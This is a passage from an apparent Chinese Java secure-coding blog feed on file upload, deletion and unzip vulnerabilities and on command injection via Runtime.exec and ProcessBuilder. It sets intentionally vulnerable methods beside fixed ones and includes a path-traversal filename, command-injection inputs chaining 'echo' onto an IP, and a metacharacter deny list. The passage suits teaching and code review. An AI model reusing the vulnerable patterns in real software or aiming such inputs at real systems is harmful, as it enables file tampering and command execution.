FilenameUtils.getName(fileName);</span><br><span class="line">        <span class="comment">// 加白名单判断后缀</span></span><br><span class="line">        String[] whiteList = &#123;<span class="string">"png"</span>,<span class="string">"jpg"</span>,<span class="string">"jpeg"</span>,<span class="string">"gif"</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span>(!FilenameUtils.isExtension(fileName.toLowerCase(), whiteList))&#123;</span><br><span class="line">            System.out.println(<span class="string">"File extension is not allow!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./owasp/src/main/resources/imgs"</span>, fileName);</span><br><span class="line">        <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">            System.out.println(<span class="string">"File not found!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> FileInputStream <span class="title">getImgFileNoFix</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./owasp/src/main/resources/imgs"</span>, fileName);</span><br><span class="line">        <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">            System.out.println(<span class="string">"File not found!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只从客户端/浏览器端禁止上传的文件类型，而后端没有对文件做限制（如上面的<code>getImgFileNoFix</code>方法），那么就可以绕过前端，抓包修改后缀，然后上传文件，另外就是注意校验请求的MimeType时一定也要校验文件后缀。</p><h4 id="3、文件删除："><a href="#3、文件删除：" class="headerlink" title="3、文件删除："></a>3、文件删除：</h4><p>文件删除 个上面类似的修复原理，避免路径穿越和指定文件类型白名单。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDelete</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String fileName = <span class="string">"../../../../../../../../../../../../../../../../111.png"</span>;</span><br><span class="line">        FileDelete fileDelete = <span class="keyword">new</span> FileDelete();</span><br><span class="line"><span class="comment">//        fileDelete.fileDeleteNoFix(fileName);</span></span><br><span class="line">        fileDelete.fileDeleteWithFix(fileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Boolean <span class="title">fileDeleteNoFix</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./owasp/src/main/resources/imgs"</span>, fileName);</span><br><span class="line">        <span class="keyword">if</span> (file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Delete success!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Delete fail!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">fileDeleteWithFix</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./owasp/src/main/resources/imgs"</span>, fileName);</span><br><span class="line">        <span class="comment">// 获取文件名，不包含路径（过滤路径穿越相关符号）</span></span><br><span class="line">        <span class="keyword">int</span> index = fileName.lastIndexOf(<span class="string">"."</span>);</span><br><span class="line">        <span class="comment">//如果使用 int index = fileName.indexOf("."); ，会获取第一个.的索引，可以用1.png.jsp绕过，修复失败</span></span><br><span class="line">        String extension = fileName.substring(index);</span><br><span class="line">        <span class="comment">// 加白名单判断后缀</span></span><br><span class="line">        String[] whiteList = &#123;<span class="string">".png"</span>, <span class="string">".jpg"</span>, <span class="string">".jpeg"</span>, <span class="string">".gif"</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String list : whiteList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (extension.toLowerCase().equals(list)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Delete success!"</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">"Delete fail!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"File extension is not allow!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、文件解压"><a href="#4、文件解压" class="headerlink" title="4、文件解压"></a>4、文件解压</h4><p>解压文件时需要小心谨慎，有两个特别的问题需要避免：一是提取出的文件标准路径落在解压的目标目录之外，一是提取出的文件消耗过多的系统资源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUnzip</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            FileUnzip fileUnzip = <span class="keyword">new</span> FileUnzip();</span><br><span class="line">            fileUnzip.unzipNoFix(<span class="string">"./owasp/src/main/resources/1.zip"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUFFER = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TOOBIG = <span class="number">0x6400000</span>; <span class="comment">// 100MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TOOMANY = <span class="number">1024</span>; <span class="comment">// max number of files</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">unzipNoFix</span><span class="params">(String filename)</span> <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(filename);</span><br><span class="line">        ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(<span class="keyword">new</span> BufferedInputStream(fis));</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Extracting: "</span> + entry);</span><br><span class="line">                <span class="keyword">int</span> count;</span><br><span class="line">                <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[BUFFER];</span><br><span class="line">                <span class="comment">// Write the files to the disk, but only if the file is not insanely big</span></span><br><span class="line">                <span class="keyword">if</span> (entry.getSize() &gt; TOOBIG) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"File to be unzipped is huge."</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (entry.getSize() == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"File to be unzipped might be huge."</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(entry.getName());</span><br><span class="line">                BufferedOutputStream dest = <span class="keyword">new</span> BufferedOutputStream(fos, BUFFER);</span><br><span class="line">                <span class="keyword">while</span> ((count = zis.read(data, <span class="number">0</span>, BUFFER)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    dest.write(data, <span class="number">0</span>, count);</span><br><span class="line">                &#125;</span><br><span class="line">                dest.flush();</span><br><span class="line">                dest.close();</span><br><span class="line">                zis.closeEntry();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            zis.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">unzipWithFix</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">        ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(<span class="keyword">new</span> BufferedInputStream(fis));</span><br><span class="line">        ZipEntry entry;</span><br><span class="line">        <span class="keyword">int</span> entries = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[BUFFER];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Extracting: "</span> + entry);</span><br><span class="line">                <span class="keyword">int</span> count;</span><br><span class="line">                <span class="comment">// Write the files to the disk, but ensure that the entryName is valid,</span></span><br><span class="line">                <span class="comment">// and that the file is not insanely big</span></span><br><span class="line">                String name = sanitzeFileName(entry.getName(), <span class="string">"."</span>);</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(name);</span><br><span class="line">                BufferedOutputStream dest = <span class="keyword">new</span> BufferedOutputStream(fos, BUFFER);</span><br><span class="line">                <span class="keyword">while</span> (total + BUFFER &lt;= TOOBIG &amp;&amp; (count = zis.read(data, <span class="number">0</span>, BUFFER)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    dest.write(data, <span class="number">0</span>, count);</span><br><span class="line">                    total += count;</span><br><span class="line">                &#125;</span><br><span class="line">                dest.flush();</span><br><span class="line">                dest.close();</span><br><span class="line">                zis.closeEntry();</span><br><span class="line">                entries++;</span><br><span class="line">                <span class="keyword">if</span> (entries &gt; TOOMANY) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Too many files to unzip."</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (total &gt; TOOBIG) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">                        <span class="string">"File being unzipped is too big."</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            zis.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件放在指定目录，防止 ../ 路径穿越</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">sanitzeFileName</span><span class="params">(String entryName, String intendedDir)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(intendedDir, entryName);</span><br><span class="line">        String canonicalPath = f.getCanonicalPath();</span><br><span class="line">        File iD = <span class="keyword">new</span> File(intendedDir);</span><br><span class="line">        String canonicalID = iD.getCanonicalPath();</span><br><span class="line">        <span class="keyword">if</span> (canonicalPath.startsWith(canonicalID)) &#123;</span><br><span class="line">            <span class="keyword">return</span> canonicalPath;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"File is outside extraction target directory."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、总结："><a href="#5、总结：" class="headerlink" title="5、总结："></a>5、总结：</h4><p>做Java 文件类代码审计时，尤其需要注意文件后缀和文件的路径是否规范，是否有存在绕过的可能。</p><p>文件上传一般修复思路：</p><ol><li>对于上传文件的后缀名截取校验时，忽略大小写，采用统一大写或小写方式进行校验；</li><li>严格检测上传文件的类型，推荐白名单校验；</li><li>jdk版本小于7u40可能存在截断漏洞，注意jdk版本；</li><li>限制文件上传的大小和频率；</li><li>文件类型校验（getContentType）</li><li>可对上传文件进行重命名、自定义后缀。</li></ol><h4 id="6、参考链接："><a href="#6、参考链接：" class="headerlink" title="6、参考链接："></a>6、参考链接：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nice0e3&#x2F;p&#x2F;13698256.html</span><br><span class="line">https:&#x2F;&#x2F;blog.m1kh.com&#x2F;index.php&#x2F;archives&#x2F;739&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jinqi520&#x2F;p&#x2F;9360713.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> 文件操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行总结</title>
      <link href="2021/09/18/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
      <url>2021/09/18/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="特殊符号-amp-、-amp-amp-、-、"><a href="#特殊符号-amp-、-amp-amp-、-、" class="headerlink" title="特殊符号&amp;、&amp;&amp;、|、||"></a>特殊符号&amp;、&amp;&amp;、|、||</h3><table><thead><tr><th>特殊符号</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>表示与，a&amp;b，条件a和条件b都执行了</td></tr><tr><td>|</td><td>表示或，a|b，条件a和条件b都执行了</td></tr><tr><td>&amp;&amp;</td><td>表示与，短路与，a&amp;&amp;b当条件a错误不会执行条件b</td></tr><tr><td>||</td><td>表示或，短路或，a||b当条件a正确不会执行条件b</td></tr></tbody></table><p>在Windows或者Linux下执行命令时，会将<code>|</code>作为管道符，将两个应用程序连接在一起，把第一个应用程序的输出作为第二个应用程序的输入。</p><p>另外Linux执行命令还有一个特殊符号<code>;</code>，多个命令顺序执行，命令之间无任何逻辑关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls;echo 123</span><br></pre></td></tr></table></figure><p>有一个坑点需要提示：</p><p>用<code>|</code>连接两个命令，<strong>前后命令都会执行</strong>，只不过不会再控制台显示第一个命令执行的结果，比如<code>dir|echo 123</code>或者<code>ls|echo 123</code>，所以导致有人认为第一个命令没有被执行，可以用<code>touch file|echo 111</code>来证实，执行命令后会创建文件<code>123</code>。</p><h3 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h3><p>Java关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec</span><br><span class="line">Process</span><br><span class="line">ProcessBuilder.start</span><br><span class="line">ProcessImpl</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在Java中命令执行最常用的有两个<code>Runtime.exec</code>和<code>ProcessBuilder.start</code>。</p><h4 id="Runtime执行命令示例"><a href="#Runtime执行命令示例" class="headerlink" title="Runtime执行命令示例"></a>Runtime执行命令示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeCmdInject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RuntimeCmdInject runtimeCmdInject = <span class="keyword">new</span> RuntimeCmdInject();</span><br><span class="line"><span class="comment">//        runtimeCmdInject.cmdNoFix("ipconfig /all");</span></span><br><span class="line">        runtimeCmdInject.cmdNoFix_1(<span class="string">"127.0.0.1&amp;echo 123321"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdNoFix</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process exec = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(exec.getInputStream());</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdNoFix_1</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process exec = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>, <span class="string">"/k"</span>, <span class="string">"ping "</span> + ip&#125;);</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(exec.getInputStream());</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdWithFix</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 特殊字符检查</span></span><br><span class="line">            String[] blackChar = &#123;<span class="string">"&amp;"</span>, <span class="string">"|"</span>, <span class="string">";"</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span> (String s : blackChar) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ip.contains(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 正则匹配IP或者域名</span></span><br><span class="line">            String pattern = <span class="string">"(^\\d+(\\.\\d+)&#123;2&#125;\\.\\d+$)|([a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\\.?)"</span>;</span><br><span class="line">            <span class="keyword">boolean</span> ismatch = Pattern.matches(pattern, ip);</span><br><span class="line">            <span class="keyword">if</span>(!ismatch)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Process exec = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"ping"</span>, ip&#125;);</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(exec.getInputStream());</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ProcessBuilder执行命令示例"><a href="#ProcessBuilder执行命令示例" class="headerlink" title="ProcessBuilder执行命令示例"></a>ProcessBuilder执行命令示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessCmdInject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProcessCmdInject processCmdInject = <span class="keyword">new</span> ProcessCmdInject();</span><br><span class="line">        processCmdInject.cmdNoFix_1(<span class="string">"127.0.0.1|echo 123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cmdNoFix</span><span class="params">(String[] cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = <span class="keyword">new</span> ProcessBuilder(cmd).start();</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span 